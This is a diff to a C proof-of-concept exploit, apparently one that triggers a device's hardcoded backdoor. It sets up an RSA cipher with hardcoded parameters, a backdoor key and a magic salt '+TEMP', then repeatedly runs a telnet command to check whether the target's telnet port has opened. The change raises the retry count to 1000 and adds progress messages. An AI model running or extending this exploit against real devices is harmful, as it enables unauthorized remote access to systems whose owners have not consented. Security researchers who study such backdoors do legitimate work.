@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <time.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -343,8 +344,10 @@ int main(int argc, char **argv) {
   char backdoor_key[16];
   char *magic_salt = "+TEMP";
   char *id;
+  clock_t start;
+  clock_t elapsed;
   unsigned char buffer[CIPHERTEXT_LENGTH];
-  int tries = 100;
+  int tries = 1000;
   char *telnet_command;
   
   printf("[+] Initializing RSA Cipher with:\n- hardcoded e: 0x%X\n- hardcoded n: 0x%s\n- no padding\n", HARDCODED_e, HARDCODED_n);
@@ -407,15 +410,15 @@ int main(int argc, char **argv) {
 
     /* Now test to see if the telnet port is open. */
 
-    if (!system(telnet_command)) {
+    if (system(telnet_command)) {
+      printf("[+] Not yet. %d tries remaining...\n", tries);
+    } else {
       printf("[*] PoC complete.\n");
       exit(0);
     }
 
   } while (tries);
   
-
-
   return 0;
 }
 
